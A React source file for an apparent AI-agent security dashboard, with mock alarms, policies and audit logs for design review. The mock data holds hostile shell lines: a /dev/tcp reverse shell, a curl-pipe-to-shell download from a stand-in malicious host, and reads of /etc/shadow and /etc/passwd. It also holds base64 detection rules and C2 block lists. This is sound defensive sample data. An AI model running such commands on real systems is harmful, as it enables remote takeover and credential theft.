import React, { useState, useEffect, useRef, useMemo } from 'react';
// import AgentlessVulAssetDetail from '@src/modules/Agentless/VulAsset/AgentlessVulAssetDetail';
import { DescribeBashEventsNew, DescribeRiskDnsEventList, DescribeVersionStatistics } from '@/pages/admin/Security/api';
// import { ECsipVersion } from '@src/constants';
import { Switch } from '@/components/ui/switch';
import { Label } from '@/components/ui/label';

import AIAgentTips from './Tips';
import AIAgentOverview from './Overview';
import ContentTables from './ContentTables';
import { ASSETS } from './constants';
import AssetDetail from './Assets/AssetDetail';
import { useAIAgentPortalBillingExempt } from './useAIAgentPortalBillingExempt';

/**
 * Mock 数据（仅用于设计走查/演示）
 * 开启后会替换 aiAgentHostList 与三组统计计数，并阻止 useEffect 中触发真实请求覆盖。
 */
const MOCK_AI_AGENT_HOSTS = [
  {
    InstanceID: 'ins-mock-001',
    Quuid: 'mock-quuid-001',
    OpenClawName: 'agent-prod-app01',
    MachineName: 'agent-prod-app01',
    AgentModel: ['hunyuan-large', 'gpt-4o'],
    AgentStatus: 1,
    ProtectType: 'Flagship',
    MachineType: 'CVM',
    RegionInfo: { RegionId: 1, RegionName: '广州' },
    IdentityTimeLast: '2026-05-30 14:22:18',
    IdentityMode: 'NETWORK',
    MetadataRiskList: ['ENV_KEY_LEAK'],
    BashCount: 3,
    MaliciousCount: 1,
    SkillsCount: 2,
    SecurityGroupIds: ['sg-mock'],
    FirewallRuleSet: [],
    hasOpenNetPolicy: true,
    ExposedType: 'INTERNET',
    AgentType: 'OpenClaw',
  },
  {
    InstanceID: 'ins-mock-002',
    Quuid: 'mock-quuid-002',
    OpenClawName: 'agent-prod-app02',
    MachineName: 'agent-prod-app02',
    AgentModel: ['claude-3.5-sonnet'],
    AgentStatus: 1,
    ProtectType: 'Flagship',
    MachineType: 'CVM',
    RegionInfo: { RegionId: 4, RegionName: '上海' },
    IdentityTimeLast: '2026-05-30 11:08:42',
    IdentityMode: 'AGENT',
    MetadataRiskList: [],
    BashCount: 0,
    MaliciousCount: 0,
    SkillsCount: 0,
    SecurityGroupIds: [],
    FirewallRuleSet: [],
    hasOpenNetPolicy: false,
    ExposedType: 'INTRANET',
    AgentType: 'OpenClaw',
  },
  {
    InstanceID: 'ins-mock-003',
    Quuid: 'mock-quuid-003',
    OpenClawName: 'agent-test-bot',
    MachineName: 'agent-test-bot',
    AgentModel: ['deepseek-v3'],
    AgentStatus: 1,
    ProtectType: 'BASIC_VERSION',
    MachineType: 'LH',
    RegionInfo: { RegionId: 8, RegionName: '北京' },
    IdentityTimeLast: '2026-05-29 19:51:02',
    IdentityMode: 'NETWORK',
    MetadataRiskList: ['MODEL_KEY_HARDCODE', 'TOOL_PERM_OVER'],
    BashCount: 5,
    MaliciousCount: 2,
    SkillsCount: 0,
    SecurityGroupIds: [],
    FirewallRuleSet: [],
    hasOpenNetPolicy: false,
    ExposedType: 'INTERNET',
    AgentType: 'Other',
  },
  {
    InstanceID: 'ins-mock-004',
    Quuid: 'mock-quuid-004',
    OpenClawName: 'agent-stage-router',
    MachineName: 'agent-stage-router',
    AgentModel: ['qwen-max', 'doubao-pro'],
    AgentStatus: 1,
    ProtectType: 'Flagship',
    MachineType: 'CVM',
    RegionInfo: { RegionId: 1, RegionName: '广州' },
    IdentityTimeLast: '2026-05-28 09:14:30',
    IdentityMode: 'AGENT',
    MetadataRiskList: [],
    BashCount: 0,
    MaliciousCount: 0,
    SkillsCount: 1,
    SecurityGroupIds: ['sg-mock'],
    FirewallRuleSet: [],
    hasOpenNetPolicy: true,
    ExposedType: 'INTRANET',
    AgentType: 'OpenClaw',
  },
];

const MOCK_RISK_HOST_COUNT = MOCK_AI_AGENT_HOSTS.filter(
  d => (d.BashCount || 0) > 0 || (d.MaliciousCount || 0) > 0 || (d.SkillsCount || 0) > 0,
).length;
const MOCK_BASH_ALARMS_COUNT = MOCK_AI_AGENT_HOSTS.reduce((s, d) => s + (d.BashCount || 0), 0);
const MOCK_MALICIOUS_ALARMS_COUNT = MOCK_AI_AGENT_HOSTS.reduce((s, d) => s + (d.MaliciousCount || 0), 0);

/**
 * 恶意 Skills mock 数据
 * 字段对齐 DescribeMalWareList 返回结构（VirusType=AgentSkill）
 */
const MOCK_SKILLS_LIST: any[] = [
  {
    Id: 90001,
    VirusName: 'AgentSkill.Backdoor.PromptInjection',
    Level: '4',
    FilePath: '/home/agent/skills/web_search/handler.py',
    Status: '4',
    CreateTime: '2026-05-30 14:25:11',
    FileCreateTime: '2026-05-25 10:00:00',
    LatestScanTime: '2026-05-30 14:25:11',
    MachineExtraInfo: { InstanceID: 'ins-mock-001', HostName: 'agent-prod-app01' },
    InstanceID: 'ins-mock-001',
    MachineType: 'CVM',
    Alias: 'agent-prod-app01',
  },
  {
    Id: 90002,
    VirusName: 'AgentSkill.Risky.ToolPermOver',
    Level: '3',
    FilePath: '/data/agent/skills/code_exec/run.sh',
    Status: '4',
    CreateTime: '2026-05-30 09:14:02',
    FileCreateTime: '2026-05-20 18:45:00',
    LatestScanTime: '2026-05-30 09:14:02',
    MachineExtraInfo: { InstanceID: 'ins-mock-001', HostName: 'agent-prod-app01' },
    InstanceID: 'ins-mock-001',
    MachineType: 'CVM',
    Alias: 'agent-prod-app01',
  },
  {
    Id: 90003,
    VirusName: 'AgentSkill.Suspicious.ModelKeyHardcode',
    Level: '2',
    FilePath: '/opt/agent/skills/auth/token.json',
    Status: '6',
    CreateTime: '2026-05-29 21:08:42',
    FileCreateTime: '2026-05-15 12:00:00',
    LatestScanTime: '2026-05-29 21:08:42',
    MachineExtraInfo: { InstanceID: 'ins-mock-004', HostName: 'agent-stage-router' },
    InstanceID: 'ins-mock-004',
    MachineType: 'CVM',
    Alias: 'agent-stage-router',
  },
];

const MOCK_SKILLS_TAGS: Record<string, string[]> = {
  90001: ['提示词注入', '高频特征'],
  90002: ['工具越权', 'shell 调用'],
  90003: ['密钥硬编码'],
};

/**
 * 威胁告警 mock 数据 - 高危命令（DescribeBashEventsNew 返回结构）
 */
const MOCK_BASH_ALARMS: any[] = [
  {
    Id: 80001,
    RuleName: '执行未知 shell 反弹脚本',
    RuleLevel: 1,
    RuleCategory: 0,
    BashCmd: 'bash -i >& /dev/tcp/45.32.xxx.xxx/4444 0>&1',
    Status: '0',
    CreateTime: '2026-05-30 14:21:08',
    ModifyTime: '2026-05-30 14:21:08',
    MachineExtraInfo: { InstanceID: 'ins-mock-001', HostName: 'agent-prod-app01' },
    MachineName: 'agent-prod-app01',
    HostName: 'agent-prod-app01',
    MachineIp: '10.0.1.18',
    InstanceID: 'ins-mock-001',
  },
  {
    Id: 80002,
    RuleName: '调用敏感系统命令 (curl 远端可执行文件)',
    RuleLevel: 2,
    RuleCategory: 0,
    BashCmd: 'curl http://malicious.example.com/x.sh | sh',
    Status: '0',
    CreateTime: '2026-05-30 11:48:55',
    ModifyTime: '2026-05-30 11:48:55',
    MachineExtraInfo: { InstanceID: 'ins-mock-001', HostName: 'agent-prod-app01' },
    MachineName: 'agent-prod-app01',
    HostName: 'agent-prod-app01',
    MachineIp: '10.0.1.18',
    InstanceID: 'ins-mock-001',
  },
  {
    Id: 80003,
    RuleName: '系统关键文件读取（/etc/shadow）',
    RuleLevel: 1,
    RuleCategory: 1,
    BashCmd: 'cat /etc/shadow',
    Status: '4',
    CreateTime: '2026-05-29 19:55:30',
    ModifyTime: '2026-05-29 22:02:11',
    MachineExtraInfo: { InstanceID: 'ins-mock-003', HostName: 'agent-test-bot' },
    MachineName: 'agent-test-bot',
    HostName: 'agent-test-bot',
    MachineIp: '10.0.3.7',
    InstanceID: 'ins-mock-003',
  },
];

/**
 * 威胁告警 mock 数据 - 恶意请求（DescribeRiskDnsEventList 返回结构）
 */
const MOCK_MALICIOUS_ALARMS: any[] = [
  {
    Id: 70001,
    PolicyName: '可疑外联 - 已知 C2 域名',
    RuleCategory: 0,
    Domain: 'c2.malicious-host.org',
    AccessCount: 27,
    HandleStatus: '0',
    LastTime: '2026-05-30 14:30:02',
    MachineExtraInfo: { InstanceID: 'ins-mock-001', HostName: 'agent-prod-app01' },
    MachineName: 'agent-prod-app01',
    HostName: 'agent-prod-app01',
    MachineIp: '10.0.1.18',
    InstanceID: 'ins-mock-001',
  },
  {
    Id: 70002,
    PolicyName: '调用大模型异常出口 - 非授权域名',
    RuleCategory: 1,
    Domain: 'api.unauthorized-llm.cn',
    AccessCount: 132,
    HandleStatus: '0',
    LastTime: '2026-05-30 09:11:48',
    MachineExtraInfo: { InstanceID: 'ins-mock-003', HostName: 'agent-test-bot' },
    MachineName: 'agent-test-bot',
    HostName: 'agent-test-bot',
    MachineIp: '10.0.3.7',
    InstanceID: 'ins-mock-003',
  },
];

/**
 * 命令管控策略 mock 数据（DescribeBashPolicies 返回结构）
 * - 头两条 Category=0 是系统拦截策略（标准 BLOCK_STANDARD_ID=2001 / 重保 BLOCK_DEEP_ID=2002）
 *   组件内会用它们驱动"高危命令自动拦截"开关与模式切换；
 * - 后续 Category=1 是用户自定义策略，覆盖告警 / 拦截 / 放行 / 黑白名单 / 不同等级等形态。
 */
const MOCK_BASH_POLICIES: any[] = [
  // 系统拦截策略（标准）
  {
    Id: 2001,
    Name: '高危命令自动拦截（标准）',
    Category: 0,
    BashAction: 2,
    Enable: 1,
    Level: 1,
    White: 0,
    Scope: 3,
    Quuids: [],
    Rules: {},
    ModifyTime: '2026-05-30 10:00:00',
  },
  // 系统拦截策略（重保）
  {
    Id: 2002,
    Name: '高危命令自动拦截（重保）',
    Category: 0,
    BashAction: 2,
    Enable: 0,
    Level: 1,
    White: 0,
    Scope: 3,
    Quuids: [],
    Rules: {},
    ModifyTime: '2026-05-30 10:00:00',
  },
  // 系统默认告警
  {
    Id: 1000,
    Name: '系统默认告警策略',
    Category: 0,
    BashAction: 0,
    Enable: 1,
    Level: 1,
    White: 0,
    Scope: 3,
    Quuids: [],
    Rules: {},
    ModifyTime: '2026-05-25 09:00:00',
  },
  // 用户自定义 - 拦截 + 高危
  {
    Id: 9001,
    Name: '拦截删除根目录命令',
    Category: 1,
    BashAction: 2,
    Enable: 1,
    Level: 1,
    White: 0,
    Scope: 0,
    Quuids: ['mock-quuid-001', 'mock-quuid-004'],
    Rules: { Process: { Cmdline: 'cm0gLXJmIC8k' /* base64: rm -rf /$ */ } },
    ModifyTime: '2026-05-30 14:22:18',
  },
  // 用户自定义 - 告警 + 中危
  {
    Id: 9002,
    Name: '告警 - curl 远端可执行文件',
    Category: 1,
    BashAction: 0,
    Enable: 1,
    Level: 2,
    White: 0,
    Scope: 0,
    Quuids: ['mock-quuid-001'],
    Rules: { Process: { Cmdline: 'Y3VybCAuKlx8XHMqc2g=' /* base64: curl .*\|\s*sh */ } },
    ModifyTime: '2026-05-30 11:48:55',
  },
  // 用户自定义 - 放行（白名单）
  {
    Id: 9003,
    Name: '白名单 - 运维巡检脚本',
    Category: 1,
    BashAction: 1,
    Enable: 1,
    Level: 0,
    White: 1,
    Scope: 0,
    Quuids: ['mock-quuid-002'],
    Rules: { Process: { Cmdline: 'L29wdC9vcHMvY2hlY2tcLnNo' /* base64: /opt/ops/check\.sh */ } },
    ModifyTime: '2026-05-29 18:05:11',
  },
  // 用户自定义 - 拦截 + 低危 + 已关闭
  {
    Id: 9004,
    Name: '拦截 - 写入 /proc 文件系统',
    Category: 1,
    BashAction: 2,
    Enable: 0,
    Level: 3,
    White: 0,
    Scope: 0,
    Quuids: ['mock-quuid-003'],
    Rules: { Process: { Cmdline: 'ZWNobyAuKiA+IC9wcm9jLy4q' /* base64: echo .* > /proc/.* */ } },
    ModifyTime: '2026-05-28 16:20:42',
  },
];

/**
 * IP/DNS 管控策略 mock 数据（DescribeRiskDnsPolicyList 返回结构）
 * 字段：PolicyId / PolicyName / PolicyType(0系统/1用户) / PolicyAction(0告警/1放行/2拦截) /
 *       IsEnabled / IsWhite / Scope / Quuids / Rules / UpdateTime / Level
 */
const MOCK_MALICIOUS_POLICIES: any[] = [
  // 系统拦截（标准）
  {
    PolicyId: 2001,
    PolicyName: 'IP/DNS 自动拦截（标准）',
    PolicyType: 0,
    PolicyAction: 2,
    IsEnabled: 1,
    IsWhite: 0,
    Scope: 3,
    Quuids: [],
    Rules: {},
    Level: 1,
    UpdateTime: '2026-05-30 10:00:00',
  },
  // 系统拦截（重保）
  {
    PolicyId: 2002,
    PolicyName: 'IP/DNS 自动拦截（重保）',
    PolicyType: 0,
    PolicyAction: 2,
    IsEnabled: 0,
    IsWhite: 0,
    Scope: 3,
    Quuids: [],
    Rules: {},
    Level: 1,
    UpdateTime: '2026-05-30 10:00:00',
  },
  // 系统默认告警
  {
    PolicyId: 1000,
    PolicyName: '系统默认告警策略',
    PolicyType: 0,
    PolicyAction: 0,
    IsEnabled: 1,
    IsWhite: 0,
    Scope: 3,
    Quuids: [],
    Rules: {},
    Level: 1,
    UpdateTime: '2026-05-25 09:00:00',
  },
  // 用户自定义 - 拦截已知 C2
  {
    PolicyId: 8001,
    PolicyName: '拦截已知 C2 域名',
    PolicyType: 1,
    PolicyAction: 2,
    IsEnabled: 1,
    IsWhite: 0,
    Scope: 0,
    Quuids: ['mock-quuid-001'],
    Rules: { Domain: ['c2.malicious-host.org', '*.bad-domain.io'] },
    Level: 1,
    UpdateTime: '2026-05-30 14:30:02',
  },
  // 用户自定义 - 拦截非授权大模型出口
  {
    PolicyId: 8002,
    PolicyName: '拦截非授权大模型出口',
    PolicyType: 1,
    PolicyAction: 2,
    IsEnabled: 1,
    IsWhite: 0,
    Scope: 0,
    Quuids: ['mock-quuid-001', 'mock-quuid-003'],
    Rules: { Domain: ['api.unauthorized-llm.cn'] },
    Level: 2,
    UpdateTime: '2026-05-30 09:11:48',
  },
  // 用户自定义 - 白名单（放行内部出口）
  {
    PolicyId: 8003,
    PolicyName: '白名单 - 内部模型网关',
    PolicyType: 1,
    PolicyAction: 1,
    IsEnabled: 1,
    IsWhite: 1,
    Scope: 0,
    Quuids: ['mock-quuid-002', 'mock-quuid-004'],
    Rules: { Domain: ['llm-gw.internal.example.com'] },
    Level: 0,
    UpdateTime: '2026-05-29 17:08:30',
  },
  // 用户自定义 - 告警 + 已关闭
  {
    PolicyId: 8004,
    PolicyName: '告警 - 高频外联 IP',
    PolicyType: 1,
    PolicyAction: 0,
    IsEnabled: 0,
    IsWhite: 0,
    Scope: 0,
    Quuids: ['mock-quuid-003'],
    Rules: { Ip: ['45.32.0.0/16'] },
    Level: 3,
    UpdateTime: '2026-05-28 21:11:09',
  },
];

const MOCK_BASH_POLICY_COUNT = MOCK_BASH_POLICIES.filter((d: any) => d.Category === 1).length;
const MOCK_MALICIOUS_POLICY_COUNT = MOCK_MALICIOUS_POLICIES.filter((d: any) => d.PolicyType === 1).length;

/**
 * 审计日志 mock 数据 - 自定义结构（占位组件不渲染表格，由 mock 模式注入新表格）
 */
const MOCK_LOGS: any[] = [
  {
    Id: 60001,
    Time: '2026-05-30 14:22:31',
    AgentName: 'agent-prod-app01',
    InstanceID: 'ins-mock-001',
    Model: 'gpt-4o',
    Action: 'tool_call',
    ToolName: 'web_search',
    Prompt: '查询某用户邮箱地址 zhangsan@example.com 在公网上的暴露情况',
    Risk: 'PII 外泄',
    RiskLevel: 'high',
    Result: '已拦截',
  },
  {
    Id: 60002,
    Time: '2026-05-30 11:08:14',
    AgentName: 'agent-prod-app02',
    InstanceID: 'ins-mock-002',
    Model: 'claude-3.5-sonnet',
    Action: 'completion',
    ToolName: '-',
    Prompt: '请总结附件文件的会议纪要',
    Risk: '-',
    RiskLevel: 'low',
    Result: '通过',
  },
  {
    Id: 60003,
    Time: '2026-05-30 09:42:55',
    AgentName: 'agent-test-bot',
    InstanceID: 'ins-mock-003',
    Model: 'deepseek-v3',
    Action: 'tool_call',
    ToolName: 'shell_exec',
    Prompt: 'ls -la / && cat /etc/passwd',
    Risk: '提示词注入 / 越权',
    RiskLevel: 'critical',
    Result: '已告警未拦截',
  },
  {
    Id: 60004,
    Time: '2026-05-29 22:15:09',
    AgentName: 'agent-stage-router',
    InstanceID: 'ins-mock-004',
    Model: 'qwen-max',
    Action: 'completion',
    ToolName: '-',
    Prompt: '生成一份产品周报，包含本周关键事件',
    Risk: '-',
    RiskLevel: 'low',
    Result: '通过',
  },
  {
    Id: 60005,
    Time: '2026-05-29 17:31:48',
    AgentName: 'agent-prod-app01',
    InstanceID: 'ins-mock-001',
    Model: 'hunyuan-large',
    Action: 'tool_call',
    ToolName: 'http_fetch',
    Prompt: 'fetch https://corp-internal.example.com/admin/users',
    Risk: '内网越权访问',
    RiskLevel: 'medium',
    Result: '通过',
  },
];

export default function AIAgent({
  hasTrialNum,
  showTipsPanel,
  setShowTipsPanel,
  getAllMachines,
  aiAgentHostList,
  setAiAgentHostList,
  isGetAllMachinesLoading,
  storageGroupData,
  isHideLogTalkTab,
  rencentScanTime,
  setOpenTrialModalVisible,
  showTrialBtn,
  setSelectedType,
  selectedAgentIds,
  setSelectedAgentIds,
  setOpenProtectModalVisible,
}: any) {
  const tabRef = useRef(null);
  const agentlessVulAssetDetailRef = useRef(null);

  // 停服态下把本模块交互触发的所有 Radix Portal 浮层（Select/Dropdown/Popover/Dialog/Drawer/Sheet 等）
  // 补打 data-billing-exempt，配合根容器上的豁免，把"组件展开/浮层内容"也一并恢复为正常态。
  // 详见./useAIAgentPortalBillingExempt.ts 头部注释（作用域/幂等/延续原生disabled 的保证）。
  useAIAgentPortalBillingExempt();

  // const isUltimateVersion = useMemo(() => csipUserInfo?.version === ECsipVersion.Ultimate, [csipUserInfo?.version]);
  const isUltimateVersion = false;

  const [activeTab, setActiveTab] = useState(ASSETS);
  const [hasFilterAlarm, setHasFilterAlarm] = useState(false);
  const [riskHostCount, setRiskHostCount] = useState(0);

  const [bashAlarmsCount, setBashAlarmsCount] = useState(0);
  const [maliciousAlarmsCount, setMaliciousAlarmsCount] = useState(0);
  const [machineVersionCount, setMachineVersionCount] = useState({} as any);
  const [selectedAssetItem, setSelectedAssetItem] = useState({} as any);
  const [assetDetailDrawerVisible, setAssetDetailDrawerVisible] = useState(false);

  // === Mock 开关：仅用于设计走查/演示，切换"无数据 / 有数据"两种形态 ===
  const [useMockData, setUseMockData] = useState(false);

  // 切换为 mock 时使用的 effective 数据（替换列表 + 三个统计计数）
  const effectiveAiAgentHostList = useMockData ? MOCK_AI_AGENT_HOSTS : aiAgentHostList;
  const effectiveRiskHostCount = useMockData ? MOCK_RISK_HOST_COUNT : riskHostCount;
  const effectiveBashAlarmsCount = useMockData ? MOCK_BASH_ALARMS_COUNT : bashAlarmsCount;
  const effectiveMaliciousAlarmsCount = useMockData ? MOCK_MALICIOUS_ALARMS_COUNT : maliciousAlarmsCount;
  // mock 时屏蔽下游回写 / 真实拉数，避免覆盖 mock 数据
  const effectiveSetAiAgentHostList = useMockData ? () => {} : setAiAgentHostList;
  const effectiveGetAllMachines = useMockData ? () => {} : getAllMachines;
  const effectiveIsGetAllMachinesLoading = useMockData ? false : isGetAllMachinesLoading;

  const getInitAlarmCount = async (hosts = aiAgentHostList) => {
    if (!hosts?.length) {
      return;
    }
    const res: any = await Promise.all([
      DescribeVersionStatistics(),
      DescribeBashEventsNew({
        Offset: 0,
        Limit: 1,
        Filters: [
          { Name: 'Status', Values: ['0'] },
          { Name: 'InstanceID', Values: hosts?.map?.((d: { InstanceID: any; }) => d.InstanceID) },
        ],
      }),
      DescribeRiskDnsEventList({
        Offset: 0,
        Limit: 1,
        Filters: [
          { Name: 'HandleStatus', Values: ['0'] },
          { Name: 'InstanceID', Values: hosts?.map?.((d: { InstanceID: any; }) => d.InstanceID) },
        ],
      }),
    ]);
    setMachineVersionCount(res?.[0] || {});
    setBashAlarmsCount(res?.[1]?.TotalCount || 0);
    setMaliciousAlarmsCount(res?.[2]?.TotalCount || 0);
  };

  useEffect(() => {
    if (!isGetAllMachinesLoading) {
      getInitAlarmCount(aiAgentHostList);
    }
  }, [isGetAllMachinesLoading]);

  return (
    /* 停服态豁免：AI Agent 安全模块整体在停服态下保持可用（用户诉求）。
       在模块根容器打 data-billing-exempt，overlay 灰化CSS 与点击拦截通过祖先选择器
       一次性覆盖模块内全部子页面（Tips / Overview / Assets / Groups / Skills /
       Alarms / Logs / AssetDetail Drawer 等）以及所有内部交互控件（Segment / Tabs /
       Select / Input / Button / Table操作列 等）。
       组件自身若传入 disabled，仍由原生 disabled 生效（延续既有禁用）。
       之前在子组件层打过 data-billing-exempt 的冗余保留，无副作用。*/
    <div className="flex flex-col gap-[20px]" data-billing-exempt>
      {/* Mock 数据开关：仅用于设计走查/演示，切换"无数据 / 有数据"两种形态 */}
      <div
        className="fixed bottom-[50px] right-4 z-[9999] flex items-center gap-2 rounded-[4px] bg-white/90 backdrop-blur border border-[#FFE7BA] px-3 py-2"
        style={{ boxShadow: 'var(--shadow-overlay)' }}
      >
        <span className="inline-flex items-center gap-1.5 rounded-full bg-[#FFF7E6] border border-[#FFE7BA] px-2 py-0.5 text-[12px] text-[#AD6800]">
          <span className="w-1.5 h-1.5 rounded-full bg-[#FA8C16]" />
          Mock 数据（仅设计走查用）
        </span>
        <Label
          htmlFor="ai-agent-mock-switch"
          className="text-[12px] text-[#525252] cursor-pointer"
        >
          {useMockData ? '已开启（展示有数据形态）' : '已关闭（展示无数据形态）'}
        </Label>
        <Switch
          id="ai-agent-mock-switch"
          checked={useMockData}
          onCheckedChange={setUseMockData}
        />
      </div>

      <AIAgentTips showTipsPanel={showTipsPanel} setShowTipsPanel={setShowTipsPanel} />
      <AIAgentOverview
        tabRef={tabRef}
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        hasFilterAlarm={hasFilterAlarm}
        setHasFilterAlarm={setHasFilterAlarm}
        aiAgentHostList={effectiveAiAgentHostList}
        riskHostCount={effectiveRiskHostCount}
        bashAlarmsCount={effectiveBashAlarmsCount}
        maliciousAlarmsCount={effectiveMaliciousAlarmsCount}
      />
      <ContentTables
        tabRef={tabRef}
        hasTrialNum={hasTrialNum}
        getInitAlarmCount={getInitAlarmCount}
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        machineVersionCount={machineVersionCount}
        getAllMachines={effectiveGetAllMachines}
        aiAgentHostList={effectiveAiAgentHostList}
        setAiAgentHostList={effectiveSetAiAgentHostList}
        setRiskHostCount={setRiskHostCount}
        storageGroupData={storageGroupData}
        isUltimateVersion={isUltimateVersion}
        hasFilterAlarm={hasFilterAlarm}
        setHasFilterAlarm={setHasFilterAlarm}
        isHideLogTalkTab={isHideLogTalkTab}
        rencentScanTime={rencentScanTime}
        showTrialBtn={showTrialBtn}
        setSelectedType={setSelectedType}
        selectedAgentIds={selectedAgentIds}
        setSelectedAgentIds={setSelectedAgentIds}
        setOpenProtectModalVisible={setOpenProtectModalVisible}
        isGetAllMachinesLoading={effectiveIsGetAllMachinesLoading}
        setOpenTrialModalVisible={setOpenTrialModalVisible}
        // === Mock 注入（仅 useMockData=true 时下发，否则保持 undefined 走真实接口） ===
        mockSkillsList={useMockData ? MOCK_SKILLS_LIST : undefined}
        mockSkillsTags={useMockData ? MOCK_SKILLS_TAGS : undefined}
        mockBashAlarms={useMockData ? MOCK_BASH_ALARMS : undefined}
        mockMaliciousAlarms={useMockData ? MOCK_MALICIOUS_ALARMS : undefined}
        mockLogs={useMockData ? MOCK_LOGS : undefined}
        mockBashPolicies={useMockData ? MOCK_BASH_POLICIES : undefined}
        mockMaliciousPolicies={useMockData ? MOCK_MALICIOUS_POLICIES : undefined}
        mockBashPolicyCount={useMockData ? MOCK_BASH_POLICY_COUNT : undefined}
        mockMaliciousPolicyCount={useMockData ? MOCK_MALICIOUS_POLICY_COUNT : undefined}
        openExposedDetailDrawer={(item: { InstanceID: any; }) => {
          // agentlessVulAssetDetailRef.current?.show?.({
          //   data: {
          //     key: item?.InstanceID,
          //   },
          // });
        }}
        openAssetDetail={(item: any, tabId = undefined, alarmTabId = undefined) => {
          setSelectedAssetItem({ ...(item || {}), tabId, alarmTabId });
          setAssetDetailDrawerVisible(true);
        }}
      />

      {assetDetailDrawerVisible && (
        <AssetDetail
          visible={assetDetailDrawerVisible}
          onClose={() => setAssetDetailDrawerVisible(false)}
          selectedItem={selectedAssetItem}
          aiAgentHostList={effectiveAiAgentHostList}
          isGetAllMachinesLoading={effectiveIsGetAllMachinesLoading}
          machineVersionCount={machineVersionCount}
          isUltimateVersion={isUltimateVersion}
          isHideLogTalkTab={isHideLogTalkTab}
          openExposedDetailDrawer={(item: { InstanceID: any; }) => {
            // agentlessVulAssetDetailRef.current?.show?.({
            //   data: {
            //     key: item?.InstanceID,
            //   },
            // });
          }}
        />
      )}

      {/* <AgentlessVulAssetDetail isFromAiAgent ref={agentlessVulAssetDetailRef} history={history} /> */}
    </div>
  );
}
